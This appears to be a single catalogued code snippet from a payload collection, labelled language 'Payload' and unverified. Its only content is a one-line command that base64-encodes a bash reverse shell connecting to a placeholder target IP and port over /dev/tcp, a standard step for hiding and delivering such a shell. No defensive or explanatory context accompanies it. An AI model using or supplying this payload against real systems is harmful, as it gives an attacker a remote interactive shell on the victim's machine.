---
id: 067da8dc-550c-4ae3-b736-ce9933732eea
type: code
language: Payload
verified: false
created_at: '2020-03-17T05:29:22.791795+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 067da8dc

**Language**: Payload

```payload
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```
